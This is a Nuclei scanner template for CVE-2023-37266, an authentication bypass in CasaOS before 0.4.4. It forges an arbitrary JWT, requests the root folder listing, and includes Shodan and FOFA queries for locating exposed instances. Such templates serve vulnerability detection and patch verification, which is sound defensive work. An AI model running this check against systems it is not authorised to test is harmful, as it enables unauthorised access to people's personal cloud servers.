http:
- extractors:
  - json:
    - .data.content[].path
    type: json
  headers:
    Authorization: '{{jwt_token}}'
  matchers:
  - condition: and
    type: word
    words:
    - '"success":200'
    - '"message":"ok"'
    - content
    - is_dir
  method: GET
  path:
  - '{{BaseURL}}/v1/folder?path=%2F'
id: CVE-2023-37266
info:
  author: iamnoooob,DhiyaneshDK,pdresearch
  classification:
    cpe: cpe:2.3:o:icewhale:casaos:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-37266
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99511
    epss-score: 0.8916
  description: 'CasaOS is an open-source Personal Cloud system. Unauthenticated attackers
    can craft arbitrary JWTs and access features that usually require authentication
    and execute arbitrary commands as `root` on CasaOS instances. This problem was
    addressed by improving the validation of JWTs in commit `705bf1f`. This patch
    is part of CasaOS 0.4.4. Users should upgrade to CasaOS 0.4.4. If they can''t,
    they should temporarily restrict access to CasaOS to untrusted users, for instance
    by not exposing it publicly.

    '
  impact: 'Successful exploitation allows unauthorized access to the CasaOS system.

    '
  metadata:
    fofa-query:
    - body="/CasaOS-UI/public/index.html"
    - body="/casaos-ui/public/index.html"
    max-request: 1
    product: casaos
    shodan-query:
    - http.html:"/CasaOS-UI/public/index.html"
    - http.html:"/casaos-ui/public/index.html"
    vendor: icewhale
    verified: true
  name: CasaOS  < 0.4.4 - Authentication Bypass via Random JWT Token
  reference:
  - https://github.com/IceWhaleTech/CasaOS/commit/705bf1facbffd2ca40b159b0303132b6fdf657ad
  - https://github.com/IceWhaleTech/CasaOS/security/advisories/GHSA-m5q5-8mfw-p2hr
  remediation: The problem was addressed by improving the validation of JWTs in 705bf1f.
    This patch is part of CasaOS 0.4.4.
  severity: critical
  tags: cve2023,cve,oss,casaos,jwt,icewhale,vuln
variables:
  jwt_data: '{"iss":"casaos","exp":1790210322,"nbf":1790199522,"iat":1790199522}'
  jwt_token: '{{generate_jwt(jwt_data, "HS256")}}'
